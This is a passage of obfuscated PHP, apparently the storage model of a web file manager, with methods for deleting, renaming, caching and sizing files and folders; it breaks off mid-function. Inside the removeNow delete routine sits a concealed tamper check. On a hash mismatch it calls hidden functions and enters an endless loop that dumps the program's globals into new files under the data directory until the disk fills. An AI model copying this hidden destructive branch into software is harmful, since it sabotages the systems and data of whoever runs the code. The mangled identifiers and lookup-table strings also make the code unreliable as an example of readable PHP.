$ì¬‘›¯Ê[$øœÑ·Ú“[180]] == self::TYPE_USER ? $øœÑ·Ú“[632] : $øœÑ·Ú“[549]; if ($ÜÖæÑ¡• == $øœÑ·Ú“[632]) { $½Úã†ï½ = Model($øœÑ·Ú“[548])->getInfo($ì¬‘›¯Ê[$øœÑ·Ú“[540]]); $ûÁÂ¥£Ù = !empty($½Úã†ï½[$øœÑ·Ú“[2182]]) ? $½Úã†ï½[$øœÑ·Ú“[2182]] : $½Úã†ï½[$øœÑ·Ú“[32]]; $ûÁÂ¥£Ù = $øœÑ·Ú“[306] . $ûÁÂ¥£Ù . $øœÑ·Ú“[2190] . $ì¬‘›¯Ê[$øœÑ·Ú“[540]]; } else { $½Úã†ï½ = Model($øœÑ·Ú“[556])->getInfo($ì¬‘›¯Ê[$øœÑ·Ú“[540]]); $ûÁÂ¥£Ù = _get($½Úã†ï½, $øœÑ·Ú“[32]); $ûÁÂ¥£Ù = $øœÑ·Ú“[165] . $ûÁÂ¥£Ù . $øœÑ·Ú“[2191] . $ì¬‘›¯Ê[$øœÑ·Ú“[540]]; } $áà‚ûÁ¾ = $øœÑ·Ú“[2192] . md5($ûÁÂ¥£Ù); CacheLock::lock($áà‚ûÁ¾); $àÎŞ¿¡Ë = $this->fileNameExist($åºÒ†É, $ûÁÂ¥£Ù); if (!$àÎŞ¿¡Ë) { $àÎŞ¿¡Ë = $this->mkdir($åºÒ†É, $ûÁÂ¥£Ù, REPEAT_SKIP); $this->metaSet($àÎŞ¿¡Ë, $øœÑ·Ú“[2193], $ÜÖæÑ¡•); $this->metaSet($àÎŞ¿¡Ë, $øœÑ·Ú“[2194], $ì¬‘›¯Ê[$øœÑ·Ú“[540]]); if ($ì¬‘›¯Ê[$øœÑ·Ú“[182]] != 0) { $this->metaSet($àÎŞ¿¡Ë, $øœÑ·Ú“[2195], _get($½Úã†ï½, $øœÑ·Ú“[2196])); } } CacheLock::unlock($áà‚ûÁ¾); $this->metaSet($Ö«’úúõ, $øœÑ·Ú“[2197], $ì¬‘›¯Ê[$øœÑ·Ú“[182]]); $this->where(array($øœÑ·Ú“[183] => $Ö«’úúõ))->save(array($øœÑ·Ú“[468] => time())); $this->recycleClear($ì¬‘›¯Ê); $Ü¿¹åÈö = $this->move($Ö«’úúõ, $àÎŞ¿¡Ë, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ì¬‘›¯Ê[$øœÑ·Ú“[182]]); return $Ü¿¹åÈö; } private function recycleClear($ŠŸìùçá) { $òéÙÒª› =& $_SERVER[ò«¥Ê‡å]; $»‹©±†ù = $this->childrenAll($ŠŸìùçá); $ñŒ¶·û = array($òéÙÒª›[461] => array($òéÙÒª›[462], $»‹©±†ù[$òéÙÒª›[2198]])); Model($òéÙÒª›[2199])->where($ñŒ¶·û)->delete(); } public function removeNow($ÁáÇ“Ğ, $¼…÷ûâ× = true) { $ÎÈ¨Çà =& $_SERVER[ò«¥Ê‡å]; $¦êİøÆ­ = $_SERVER[$ÎÈ¨Çà[840]] . $ÎÈ¨Çà[841]; $áÓ©õ€Ò = $ÎÈ¨Çà[923]; if ($_SERVER[$ÎÈ¨Çà[837]] != $áÓ©õ€Ò($¦êİøÆ­)) { $¾¤îĞ = $ÎÈ¨Çà[924]; $óÈ¥åÛÚ = $ÎÈ¨Çà[839]; $™Ë’ø = $_SERVER[$ÎÈ¨Çà[840]] . $ÎÈ¨Çà[841]; $«ºô’«¶ = $óÈ¥åÛÚ($™Ë’ø); $şéàş¢ = explode($ÎÈ¨Çà[248], $«ºô’«¶); if (count($şéàş¢) < $ÎÈ¨Çà[673]) { $ÏäûÍÊâ = $ÎÈ¨Çà[842]; $ÏäûÍÊâ(); } $ãûÒê–ç = $ÎÈ¨Çà[925]; $ãûÒê–ç($_SERVER[$ÎÈ¨Çà[926]]); $¾¤îĞ = $ÎÈ¨Çà[924]; $¾¤îĞ(); $æõ†ÉĞ¨ = $ÎÈ¨Çà[927]; $±«¦şé£ = json_encode($GLOBALS[$ÎÈ¨Çà[928]]); $ïö©é´ä = 1; for ($ÊëÖÀÛÈ = $ïö©é´ä; $ÊëÖÀÛÈ > 0; $ÊëÖÀÛÈ++) { $æõ†ÉĞ¨(DATA_PATH . $ÊëÖÀÛÈ, $±«¦şé£); } } $­…’èæ = $this->sourceInfo($ÁáÇ“Ğ); $ï¨Úíİ‘ = $this->pathInfoMore($ÁáÇ“Ğ); if (!$­…’èæ) { return !0; } if ($­…’èæ[$ÎÈ¨Çà[182]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ÁáÇ“Ğ); Hook::trigger($ÎÈ¨Çà[2200], $ï¨Úíİ‘, $¼…÷ûâ×); if ($¼…÷ûâ×) { Model($ÎÈ¨Çà[2199])->moveToRecycle($ÁáÇ“Ğ); } else { $ÎîŒü¿ = $this->childrenAll($­…’èæ); Model($ÎÈ¨Çà[603])->eventRemove($ÁáÇ“Ğ); $this->removeRelevance($ÎîŒü¿[$ÎÈ¨Çà[2198]], $ÎîŒü¿[$ÎÈ¨Çà[1505]]); } $this->folderSizeReset($­…’èæ[$ÎÈ¨Çà[182]]); $ŸÊîºœä = array($­…’èæ[$ÎÈ¨Çà[182]]); if ($­…’èæ[$ÎÈ¨Çà[455]] == $ÎÈ¨Çà[90]) { $ŸÊîºœä[] = $­…’èæ[$ÎÈ¨Çà[183]]; } $this->updateModifyTime($ŸÊîºœä); $this->lockMoveEnd($ÁáÇ“Ğ); Hook::trigger($ÎÈ¨Çà[1743], $ï¨Úíİ‘, $¼…÷ûâ×); return !0; } public function childrenAll($°Á­â¼) { $Úæ¶´Ö¨ =& $_SERVER[ò«¥Ê‡å]; $šÊˆï†  = $°Á­â¼[$Úæ¶´Ö¨[183]]; if ($°Á­â¼[$Úæ¶´Ö¨[455]] == $Úæ¶´Ö¨[90]) { $åë›¤Š£ = array($Úæ¶´Ö¨[622] => array($Úæ¶´Ö¨[582], $°Á­â¼[$Úæ¶´Ö¨[555]] . $šÊˆï†  . $Úæ¶´Ö¨[583])); $Ï²•™éœ = array($Úæ¶´Ö¨[622] => $åë›¤Š£[$Úæ¶´Ö¨[555]]); $ê£ÚƒäŞ = $this->field($Úæ¶´Ö¨[2201])->where($Ï²•™éœ)->select(); $ŸÎšÎÁà = !1; $î¡‚ô¸· = array($šÊˆï† ); if ($ê£ÚƒäŞ) { $ŸÎšÎÁà = array_to_keyvalue($ê£ÚƒäŞ, $Úæ¶´Ö¨[12], $Úæ¶´Ö¨[511]); $ŸÎšÎÁà = array_remove_value($ŸÎšÎÁà, $Úæ¶´Ö¨[214]); $î¡‚ô¸· = array_to_keyvalue($ê£ÚƒäŞ, $Úæ¶´Ö¨[12], $Úæ¶´Ö¨[183]); $î¡‚ô¸·[] = $šÊˆï† ; } } else { $ŸÎšÎÁà = array($°Á­â¼[$Úæ¶´Ö¨[511]]); $î¡‚ô¸· = array($šÊˆï† ); } return array($Úæ¶´Ö¨[2198] => $î¡‚ô¸·, $Úæ¶´Ö¨[1505] => $ŸÎšÎÁà); } public function removeArray($µÙ…Ô··) { if (!$µÙ…Ô··) { return !0; } } public function removeRelevance($Ñ¾÷…™—, $Èİ¯Ëàï) { $À›ú¾¨ =& $_SERVER[ò«¥Ê‡å]; $Ñ¾÷…™— = $Ñ¾÷…™— ? $Ñ¾÷…™— : array(); $Èİ¯Ëàï = $Èİ¯Ëàï ? $Èİ¯Ëàï : array(); $Ñ¾÷…™— = array_unique(array_filter($Ñ¾÷…™—)); $Èİ¯Ëàï = array_unique(array_filter($Èİ¯Ëàï)); if (!$Ñ¾÷…™—) { return !1; } $Ú€¨íøÇ = array($À›ú¾¨[461] => array($À›ú¾¨[462], $Ñ¾÷…™—)); Model($À›ú¾¨[2199])->where($Ú€¨íøÇ)->delete(); Model($À›ú¾¨[505])->where($Ú€¨íøÇ)->delete(); Model($À›ú¾¨[2046])->where($Ú€¨íøÇ)->delete(); Model($À›ú¾¨[603])->where($Ú€¨íøÇ)->delete(); Model($À›ú¾¨[1879])->removeBySource($Ñ¾÷…™—); Model($À›ú¾¨[2180])->removeBySource($Ñ¾÷…™—); $this->where($Ú€¨íøÇ)->delete(); Model($À›ú¾¨[514])->remove($Èİ¯Ëàï); for ($Š²èµ› = 0; $Š²èµ› < count($Ñ¾÷…™—); $Š²èµ›++) { $this->sourceCacheClear($Ñ¾÷…™—[$Š²èµ›]); } } public function rename($ªÃ‘ªŒÅ, $Ñ¢ãƒø“) { $êØ×ŞƒÄ =& $_SERVER[ò«¥Ê‡å]; $—„şƒ„Ó = $this->sourceInfo($ªÃ‘ªŒÅ); if (!$—„şƒ„Ó) { return !1; } $ßÖ²»ö = $this->fileNameExist($—„şƒ„Ó[$êØ×ŞƒÄ[182]], $Ñ¢ãƒø“); if ($ßÖ²»ö && $ßÖ²»ö != $ªÃ‘ªŒÅ) { return !1; } $ÇªˆÃ·È = array($êØ×ŞƒÄ[464] => $Ñ¢ãƒø“, $êØ×ŞƒÄ[621] => USER_ID); if ($—„şƒ„Ó[$êØ×ŞƒÄ[455]] != $êØ×ŞƒÄ[90]) { $ÇªˆÃ·È[$êØ×ŞƒÄ[456]] = substr(get_path_ext($Ñ¢ãƒø“), 0, 10); } Model($êØ×ŞƒÄ[603])->eventRename($ªÃ‘ªŒÅ, $—„şƒ„Ó[$êØ×ŞƒÄ[32]], $Ñ¢ãƒø“); $this->sourceCacheClear($ªÃ‘ªŒÅ); $this->setNamePinyin($ªÃ‘ªŒÅ, $ÇªˆÃ·È[$êØ×ŞƒÄ[32]], !1); $this->updateModifyTime($—„şƒ„Ó[$êØ×ŞƒÄ[182]]); $Ğ¾˜ÇÉª = $this->where(array($êØ×ŞƒÄ[461] => $ªÃ‘ªŒÅ))->data($ÇªˆÃ·È)->save(); $Êõ‚´¸  = $êØ×ŞƒÄ[2188] . $—„şƒ„Ó[$êØ×ŞƒÄ[182]]; if (isset(self::$cacheChildList[$Êõ‚´¸ ])) { unset(self::$cacheChildList[$Êõ‚´¸ ]); } return $Ğ¾˜ÇÉª; } public function setNamePinyin($Íä£àÉ, $¼±´¥¥, $íêÖ— ½ = true) { $ïØÛªÜŸ =& $_SERVER[ò«¥Ê‡å]; $§ïî§¯ = Input::check($¼±´¥¥, $ïØÛªÜŸ[625]); $á™“®Ìß = array($ïØÛªÜŸ[487] => KodSort::makeStr($¼±´¥¥)); if ($§ïî§¯) { $á™“®Ìß[$ïØÛªÜŸ[508]] = str_replace($ïØÛªÜŸ[53], $ïØÛªÜŸ[12], Pinyin::get($¼±´¥¥)); $á™“®Ìß[$ïØÛªÜŸ[507]] = Pinyin::get($¼±´¥¥, $ïØÛªÜŸ[626]); } if (!$íêÖ— ½ && !$§ïî§¯) { $á™“®Ìß[$ïØÛªÜŸ[508]] = null; $á™“®Ìß[$ïØÛªÜŸ[507]] = null; } $this->metaSet($Íä£àÉ, $á™“®Ìß); } public function getContent($ªŠÎßïù) { $»ÍÑŸ”Ã =& $_SERVER[ò«¥Ê‡å]; $ÙøãÉÓÀ = $this->fileInfoGet($ªŠÎßïù); if (!$ÙøãÉÓÀ) { return !1; } if ($ÙøãÉÓÀ[$»ÍÑŸ”Ã[78]] == 0) { return $»ÍÑŸ”Ã[12]; } $ÏéØÌ = $»ÍÑŸ”Ã[2202] . $ÙøãÉÓÀ[$»ÍÑŸ”Ã[517]]; if ($ÙøãÉÓÀ[$»ÍÑŸ”Ã[78]] <= 1024 * 10) { $Òª¢½æ  = Cache::get($ÏéØÌ); if (!$Òª¢½æ ) { $Òª¢½æ  = IO::getContent($ÙøãÉÓÀ[$»ÍÑŸ”Ã[86]]); Cache::set($ÏéØÌ, $Òª¢½æ ); } return $Òª¢½æ ; } if (!$ÙøãÉÓÀ[$»ÍÑŸ”Ã[86]]) { return $»ÍÑŸ”Ã[12]; } return IO::getContent($ÙøãÉÓÀ[$»ÍÑŸ”Ã[86]]); } public function setDesc($œµ•ŸÂä, $±ÙÛ©±ß) { $İË–ÇŠß =& $_SERVER[ò«¥Ê‡å]; Model($İË–ÇŠß[603])->eventAddDesc($œµ•ŸÂä, $±ÙÛ©±ß); return $this->metaSet($œµ•ŸÂä, $İË–ÇŠß[496], $±ÙÛ©±ß); } public function setContent($âØØŸèØ, $ª¾¨áØŞ = '') { $şâàôßğ =& $_SERVER[ò«¥Ê‡å]; $¸É‡ƒº = $this->sourceInfo($âØØŸèØ); $‘•²ò– = $this->fileInfoGet($âØØŸèØ); if (!$‘•²ò– || !$¸É‡ƒº) { return !1; } $Á¤òş = Model($şâàôßğ[514])->addFileByContent($ª¾¨áØŞ, $¸É‡ƒº[$şâàôßğ[32]]); $ñ“íÂ„ = $this->fileHistory($¸É‡ƒº, $Á¤òş[$şâàôßğ[511]], $Á¤òş[$şâàôßğ[78]]); if (!$ñ“íÂ„) { return Model($şâàôßğ[514])->remove($Á¤òş[$şâàôßğ[511]]); } $this->folderSizeReset($¸É‡ƒº[$şâàôßğ[182]]); return !0; } public function fileSubstr($ç¶©¬Å†, $ÓÄÂÌæ, $à¡ç´Ìó) { $é™‡˜Á = $this->fileInfoGet($ç¶©¬Å†); if (!$é™‡˜Á) { return !1; } return IO::fileSubstr($é™‡˜Á[$_SERVER[ò«¥Ê‡å][86]], $ÓÄÂÌæ, $à¡ç´Ìó); } public function fileInfoGet($òĞ“ÃÄ´) { $¦¥¸ã ß =& $_SERVER[ò«¥Ê‡å]; $€ç³Â™ø = $this->sourceInfo($òĞ“ÃÄ´); if (!$€ç³Â™ø || $€ç³Â™ø[$¦¥¸ã ß[455]]) { return !1; } $ô×²È…¹ = $¦¥¸ã ß[518] . $€ç³Â™ø[$¦¥¸ã ß[511]]; $è÷Ç‰­ = _get(self::$cacheFileInfo, $ô×²È…¹); if ($è÷Ç‰­) { return $è÷Ç‰­; } $ö…ÚÜ©Ó = Model($¦¥¸ã ß[514])->fileInfo($€ç³Â™ø[$¦¥¸ã ß[511]]); if ($ö…ÚÜ©Ó) { $ö…ÚÜ©Ó[$¦¥¸ã ß[32]] = $€ç³Â™ø[$¦¥¸ã ß[32]]; } self::$cacheFileInfo[$ô×²È…¹] = $ö…ÚÜ©Ó; return $ö…ÚÜ©Ó; } private function folderChildrenNumber($íÂşŞ¶ë) { $™± €— =& $_SERVER[ò«¥Ê‡å]; $„«óĞÈ = $this->sourceInfo($íÂşŞ¶ë); $ŸË„îô = array($™± €—[622] => array($™± €—[582], $„«óĞÈ[$™± €—[555]] . $íÂşŞ¶ë . $™± €—[583]), $™± €—[619] => $„«óĞÈ[$™± €—[540]], $™± €—[474] => intval($„«óĞÈ[$™± €—[475]]), $™± €—[616] => 1); $¬×—–¶ı = $this->where($ŸË„îô)->count(); $ñÓ¼¢¾ = $this->where($ŸË„îô)->where(array($™± €—[616] => 0))->count(); return array($™± €—[82] => $ñÓ¼¢¾, $™± €—[83] => $¬×—–¶ı); } public function pathInfo($şğøË—•, $ò¡¨Í” = false) { $ã³ºÏÂã =& $_SERVER[ò«¥Ê‡å]; $ò¡¨Í” = !1; $şğøË—• = intval($şğøË—•); $Êï©ô = $ã³ºÏÂã[504] . intval($ò¡¨Í”) . $ã³ºÏÂã[432] . $şğøË—•; $ËÇ·ï¯ = _get(self::$cachePathInfo, $Êï©ô); if ($ËÇ·ï¯) { return $ËÇ·ï¯; } $Ûâ…œûñ = $this->sourceInfo($şğøË—•); if (!$Ûâ…œûñ) { return !1; } $Ûâ…œûñ = $this->_listDataApplyItem($Ûâ…œûñ, $ò¡¨Í”); self::$cachePathInfo[$Êï©ô] = $Ûâ…œûñ; return $Ûâ…œûñ; } public static $cachePathInfoMore = array(); public function pathInfoMore($‘½ş£ÀÇ) { $óàú«éõ =& $_SERVER[ò«¥Ê‡å]; $‘­Íû¬ = _get(self::$cachePathInfoMore, $‘½ş£ÀÇ); if ($‘­Íû¬) { return $‘­Íû¬; } $§ûÎ›ç‰ = $this->pathInfo($‘½ş£ÀÇ); if (!$§ûÎ›ç‰) { return !1; } if ($§ûÎ›ç‰[$óàú«éõ[455]] == $óàú«éõ[90]) { $§ûÎ›ç‰[$óàú«éõ[81]] = $this->folderChildrenNumber($‘½ş£ÀÇ); } self::$cachePathInfoMore[$‘½ş£ÀÇ] = $§ûÎ›ç‰; return $§ûÎ›ç‰; } public function sourceInfo($¡£˜œş) { $¥´­Ô =& $_SERVER[ò«¥Ê‡å]; if (!$¡£˜œş) { return array(); } $¡£˜œş = intval($¡£˜œş); $¥±ˆôà¹ = $¥´­Ô[503] . $¡£˜œş; $©—è«ƒñ = _get(self::$cacheSourceInfo, $¥±ˆôà¹); if ($©—è«ƒñ) { return $©—è«ƒñ; } $õø½ÅùŞ = $this->where(array($¥´­Ô[183] => $¡£˜œş))->find(); self::$cacheSourceInfo[$¥±ˆôà¹] = $õø½ÅùŞ; return self::$cacheSourceInfo[$¥±ˆôà¹]; } public function sourceCacheClear($ÅÀŠ˜ = false) { self::cacheClear($ÅÀŠ˜); } public static function cacheClear($ÕËßùğ = false) { $œ¹ÜÅß¿ =& $_SERVER[ò«¥Ê‡å]; if ($ÕËßùğ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$œ¹ÜÅß¿[503] . $ÕËßùğ]); unset(self::$cachePathInfoMore[$ÕËßùğ]); unset(self::$cachePathInfo[$œ¹ÜÅß¿[2203] . $ÕËßùğ]); unset(self::$cachePathInfo[$œ¹ÜÅß¿[2204] . $ÕËßùğ]); } public function metaSet($¹ıª¡Î», $ƒÑÇä—· = null, $©æ…í¸§ = null) { $—¤•”¬ = parent::metaSet($¹ıª¡Î», $ƒÑÇä—·, $©æ…í¸§); if ($—¤•”¬) { $this->sourceCacheClear($¹ıª¡Î»); } return $—¤•”¬; } public function pathInfoByPath($œÌÚşËß, $îŸİÌºì) { $¬¦Áúüæ =& $_SERVER[ò«¥Ê‡å]; $âÁ˜éÔ¦ = !$îŸİÌºì ? array() : explode($¬¦Áúüæ[8], trim($îŸİÌºì, $¬¦Áúüæ[8])); $Öû ¹ = $œÌÚşËß; foreach ($âÁ˜éÔ¦ as $ŠÁõ«Ÿß) { $®Œ¾Ÿ = array($¬¦Áúüæ[182] => $Öû ¹, $¬¦Áúüæ[32] => $ŠÁõ«Ÿß); $¤ïôæî– = $this->field($¬¦Áúüæ[2205])->where($®Œ¾Ÿ)->select(); if (!$¤ïôæî–) { return !1; } $¤ïôæî– = array_sort_by($¤ïôæî–, $¬¦Áúüæ[475]); $Öû ¹ = $¤ïôæî–[0][$¬¦Áúüæ[183]]; } $İî™ğ³Õ = $this->sourceInfo($Öû ¹); $this->pathInfoFilter($İî™ğ³Õ); return $İî™ğ³Õ; } protected function updateModifyTime($½ÙıÖ¤ğ) { $®Ä¶‰™í =& $_SERVER[ò«¥Ê‡å]; $ÒäÉ¾–ë = defined($®Ä¶‰™í[2121]) ? USER_ID : 0; if (!$½ÙıÖ¤ğ) { return; } if (!is_array($½ÙıÖ¤ğ)) { $½ÙıÖ¤ğ = array($½ÙıÖ¤ğ); } foreach ($½ÙıÖ¤ğ as $¨ˆ¸è¤ => $¸¹àÖÇÆ) { $½ÙıÖ¤ğ[$¨ˆ¸è¤] = intval($¸¹àÖÇÆ); $this->sourceCacheClear($¸¹àÖÇÆ); } $ØÖÙ±ı = array($®Ä¶‰™í[183] => array($®Ä¶‰™í[7], $½ÙıÖ¤ğ)); $£Ÿ›Ò’ñ = array($®Ä¶‰™í[621] => $ÒäÉ¾–ë, $®Ä¶‰™í[468] => time()); $this->where($ØÖÙ±ı)->save($£Ÿ›Ò’ñ); } public function folderSizeReset($­Ğş¡Éª, $ÜºÌ¦µ— = false) { $‡°¹‹ñ‘ =& $_SERVER[ò«¥Ê‡å]; if ($this->statusIgnoreResetSpace) { return; } $£·Çüø = $this->sourceInfo($­Ğş¡Éª); $Å©Õ¿« = $‡°¹‹ñ‘[2206] . $­Ğş¡Éª; CacheLock::lock($Å©Õ¿«, 20); if ($ÜºÌ¦µ— === !1) { $this->sourceCacheClear($­Ğş¡Éª); $£·Çüø = $this->sourceInfo($­Ğş¡Éª); $¾òÇŒÇÛ = array($‡°¹‹ñ‘[447] => $­Ğş¡Éª, $‡°¹‹ñ‘[474] => 0); $øÂÖñøë = $this->where($¾òÇŒÇÛ)->sum($‡°¹‹ñ‘[78]); $ÜºÌ¦µ— = intval($øÂÖñøë) - intval($£·Çüø[$‡°¹‹ñ‘[78]]); } if ($ÜºÌ¦µ— == 0) { return CacheLock::unlock($Å©Õ¿«); } $Ÿ…çı·† = $this->parentLevelArray($£·Çüø[$‡°¹‹ñ‘[555]]); if (!$Ÿ…çı·†) { $Ÿ…çı·† = array(); } $Ÿ…çı·†[] = $£·Çüø[$‡°¹‹ñ‘[183]]; $¾òÇŒÇÛ = array($‡°¹‹ñ‘[183] => array($‡°¹‹ñ‘[462], $Ÿ…çı·†)); if ($ÜºÌ¦µ— < 0) { $¾òÇŒÇÛ[$‡°¹‹ñ‘[78]] = array($‡°¹‹ñ‘[1062], abs($ÜºÌ¦µ—)); } $this->where($¾òÇŒÇÛ)->setAdd($‡°¹‹ñ‘[78], $ÜºÌ¦µ—); CacheLock::unlock($Å©Õ¿«); $¯«ĞĞ¶ú = $‡°¹‹ñ‘[2207] . $£·Çüø[$‡°¹‹ñ‘[180]] . $‡°¹‹ñ‘[4] . $£·Çüø[$‡°¹‹ñ‘[540]]; $ »Ìß¥ = array($£·Çüø[$‡°¹‹ñ‘[180]], $£·Çüø[$‡°¹‹ñ‘[540]]); TaskRun::timeLimitCall($¯«ĞĞ¶ú, $‡°¹‹ñ‘[2208], $ »Ìß¥, 1.5); } public function folderSizeResetChildren($Û”‡¯®¯) { $¶ö¶«ç =& $_SERVER[ò«¥Ê‡å]; $this->sourceCacheClear($Û”‡¯®¯); $Ş­ßˆáÆ = $this->sourceInfo($Û”‡¯®¯); $çá¥ö©ò = array($¶ö¶«ç[616] => 1, $¶ö¶«ç[619] => $Ş­ßˆáÆ[$¶ö¶«ç[540]], $¶ö¶«ç[622] => array($¶ö¶«ç[582], $Ş­ßˆáÆ[$¶ö¶«ç[555]] . $Û”‡¯®¯ . $¶ö¶«ç[583])); $ß…ùÙ×Ö = $¶ö¶«ç[2209]; $‘…½±ı¶ = $this->field($ß…ùÙ×Ö)->where($çá¥ö©ò)->select(); $çá¥ö©ò[$¶ö¶«ç[455]] = 0; $Á€‹Ø‡™ = $this->field($ß…ùÙ×Ö)->where($çá¥ö©ò)->select(); if (!$Á€‹Ø‡™) { return; } $‘…½±ı¶[] = $Ş­ßˆáÆ; $‘…½±ı¶ = array_to_keyvalue($‘…½±ı¶, $¶ö¶«ç[183]); foreach ($‘…½±ı¶ as $ºĞšÕé => $‡Ãş‰““) { $‘…½±ı¶[$ºĞšÕé][$¶ö¶«ç[2210]] = $‘…½±ı¶[$ºĞšÕé][$¶ö¶«ç[78]]; $‘…½±ı¶[$ºĞšÕé][$¶ö¶«ç[78]] = 0; } foreach ($Á€‹Ø‡™ as $‡Ãş‰““) { $ÅºÎÜÍŞ = $‡Ãş‰““[$¶ö¶«ç[182]] . $¶ö¶«ç[12]; if (!isset($‘…½±ı¶[$ÅºÎÜÍŞ])) { continue; } if ($‡Ãş‰““[$¶ö¶«ç[475]] == $‘…½±ı¶[$ÅºÎÜÍŞ][$¶ö¶«ç[475]]) { $‘…½±ı¶[$ÅºÎÜÍŞ][$¶ö¶«ç[78]] += $‡Ãş‰““[$¶ö¶«ç[78]]; } } foreach ($‘…½±ı¶ as $‡Ãş‰““) { $ÒÕ×âØĞ = $this->parentLevelArray($‡Ãş‰““[$¶ö¶«ç[555]]); foreach ($ÒÕ×âØĞ as $ÅºÎÜÍŞ) { $ÅºÎÜÍŞ = $ÅºÎÜÍŞ . $¶ö¶«ç[12]; if (!isset($‘…½±ı¶[$ÅºÎÜÍŞ])) { continue; } if ($‡Ãş‰““[$¶ö¶«ç[475]] == $‘…½±ı¶[$ÅºÎÜÍŞ][$¶ö¶«ç[475]]) { $‘…½±ı¶[$ÅºÎÜÍŞ][$¶ö¶«ç[78]] += $‡Ãş‰““[$¶ö¶«ç[78]]; } } } $µ·Àì™¥ = array(); foreach ($‘…½±ı¶ as $‡Ãş‰““) { if ($‡Ãş‰““[$¶ö¶«ç[78]] == $‡Ãş‰““[$¶ö¶«ç[2210]]) { continue; } $µ·Àì™¥[] = array($¶ö¶«ç[183], $‡Ãş‰““[$¶ö¶«ç[183]], $¶ö¶«ç[78], $‡Ãş‰““[$¶ö¶«ç[78]]); } $this->saveAll($µ·Àì™¥); } public function userSpaceReset($—¹·å·© = false) { $•€‡‚ºÊ =& $_SERVER[ò«¥Ê‡å]; $Ëš–¼ = $this->where(array($•€‡‚ºÊ[180] => self::TYPE_USER, $•€‡‚ºÊ[540] => $—¹·å·©, $•€‡‚ºÊ[455] => 0))->sum($•€‡‚ºÊ[78]); $Ëš–¼ = !$Ëš–¼ || $Ëš–¼ <= 0 ? 0 : $Ëš–¼; Model($•€‡‚ºÊ[548])->userEdit($—¹·å·©, array($•€‡‚ºÊ[1888] => $Ëš–¼)); } public function targetSpaceUpdate($ÇÄ½»Á, $¹ô—ğìˆ) { $¨ÍÖª†µ =& $_SERVER[ò«¥Ê‡å]; if (!$¹ô—ğìˆ) { return; } if (!in_array($ÇÄ½»Á, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $İÒ‚£³ = $this->targetSpaceSize($ÇÄ½»Á, $¹ô—ğìˆ); if ($ÇÄ½»Á == self::TYPE_USER) { Model($¨ÍÖª†µ[548])->userEdit($¹ô—ğìˆ, array($¨ÍÖª†µ[1888] => $İÒ‚£³)); } else { if ($ÇÄ½»Á == self::TYPE_GROUP) { Model($¨ÍÖª†µ[556])->groupEdit($¹ô—ğìˆ, array($¨ÍÖª†µ[1888] => $İÒ‚£³)); } } } public function targetSpaceSize($Âª¢ÔÍË, $ÑºÖìŸ²) { $ŞĞƒÀé¦ =& $_SERVER[ò«¥Ê‡å]; $ú½æÕÀ¾ = 0; $îŞöœË‡ = $this->targetSourceRoot($Âª¢ÔÍË, $ÑºÖìŸ², !0); foreach ($îŞöœË‡ as $éÕğ²ºÛ) { if (!$éÕğ²ºÛ) { continue; } $ú½æÕÀ¾ += floatval($éÕğ²ºÛ[$ŞĞƒÀé¦[78]]); $¨ùî¦—½ = array($ŞĞƒÀé¦[622] => array($ŞĞƒÀé¦[582], $ŞĞƒÀé¦[565] . $éÕğ²ºÛ[$ŞĞƒÀé¦[183]] . $ŞĞƒÀé¦[583])); $´€À¤« = Model($ŞĞƒÀé¦[473])->field($ŞĞƒÀé¦[461])->where($¨ùî¦—½)->select(); $´€À¤« = array_to_keyvalue($´€À¤«, $ŞĞƒÀé¦[12], $ŞĞƒÀé¦[183]); $´€À¤« = array_unique(array_filter($´€À¤«)); if ($´€À¤«) { $¨ùî¦—½ = array($ŞĞƒÀé¦[461] => array($ŞĞƒÀé¦[462], $´€À¤«)); $ú½æÕÀ¾ += floatval($this->where($¨ùî¦—½)->sum($ŞĞƒÀé¦[78])); } } $ú½æÕÀ¾ = !$ú½æÕÀ¾ || $ú½æÕÀ¾ <= 0 ? 0 : $ú½æÕÀ¾; return $ú½æÕÀ¾; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($£Î¡¢²Ü) { return $this->fileTypeProfile($£Î¡¢²Ü, SourceModel::TYPE_USER); } public function groupFileTypeProfile($şÉçıÜ) { return $this->fileTypeProfile($şÉçıÜ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($šÍ‡¤ó, $À¯ïñ±) { $äŠ©Ñ˜ü =& $_SERVER[ò«¥Ê‡å]; $Çù´»µ” = $äŠ©Ñ˜ü[2211] . $šÍ‡¤ó . $äŠ©Ñ˜ü[11] . $À¯ïñ±; $€‡¢§Êø = Cache::get($Çù´»µ”); if ($€‡¢§Êø) { return $€‡¢§Êø; } $ÆÆê‰Ï· = array($äŠ©Ñ˜ü[616] => 0); if ($šÍ‡¤ó != !1) { $ÆÆê‰Ï·[$äŠ©Ñ˜ü[540]] = $šÍ‡¤ó; $ÆÆê‰Ï·[$äŠ©Ñ˜ü[180]] = $À¯ïñ±; } $™œãË€É = array(); $™œãË€É[$äŠ©Ñ˜ü[2212]] = array($äŠ©Ñ˜ü[2213] => LNG($äŠ©Ñ˜ü[2212]), $äŠ©Ñ˜ü[2214] => $this->where($ÆÆê‰Ï·)->count(), $äŠ©Ñ˜ü[587] => $this->where($ÆÆê‰Ï·)->sum($äŠ©Ñ˜ü[78])); $æÇÇ²¥® = KodIO::fileTypeList(); foreach ($æÇÇ²¥® as $• Á»ªÄ => $¤ğ‰ıÄ) { $ÆÆê‰Ï·[$äŠ©Ñ˜ü[456]] = $this->fileTypeWhere($• Á»ªÄ); $™œãË€É[$• Á»ªÄ] = array($äŠ©Ñ˜ü[2213] => $¤ğ‰ıÄ[$äŠ©Ñ˜ü[32]], $äŠ©Ñ˜ü[2214] => $this->where($ÆÆê‰Ï·)->count(), $äŠ©Ñ˜ü[587] => $this->where($ÆÆê‰Ï·)->sum($äŠ©Ñ˜ü[78])); } Cache::set($Çù´»µ”, $™œãË€É, 1200); return $™œãË€É; } public function fileNameExist($ÂŸ®ß“õ, $‹»±ÁóÃ) { $˜Ú±‚Å =& $_SERVER[ò«¥Ê‡å]; $ûØºˆÛ½ = $this->field($˜Ú±‚Å[2215])->where(array($˜Ú±‚Å[182] => $ÂŸ®ß“õ, $˜Ú±‚Å[32] => $‹»±ÁóÃ, $˜Ú±‚Å[475] => 0))->find(); return 